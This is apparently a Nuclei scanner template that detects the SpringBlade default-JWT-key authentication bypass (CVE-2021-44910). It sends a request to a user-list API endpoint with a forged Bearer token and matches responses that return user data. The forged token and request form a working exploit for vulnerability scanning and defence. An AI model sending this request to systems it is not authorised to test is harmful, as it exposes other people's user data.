id: springblade-default-jwt-key-authentication-bypass
info:
  name: Springblade Default JWT Key Authentication Bypass (CVE-2021-44910)
  author: ProjectDiscoveryAI
  severity: high
  tags: authentication-bypass,CVE-2021-44910
http:
  - method: GET
    path:
      - /api/blade-user/user-list
    headers:
      Blade-Auth: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9..UHWWVEc6oi6Z6_AC5_WcRrKS9fB3aYH7XZxL9_xH-yIoUNeBrFoylXjGEwRY3Dv7GJeFnl5ppu8eOS3YYFqdeQ
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"code":200'
          - '"success":true'
          - '"data":['
          - '"name"'
      - type: regex
        part: body
        regex:
          - "^(?!.*<).*$"  # Ensures body does not contain '<'
      - type: word
        part: header
        words:
          - "application/json"
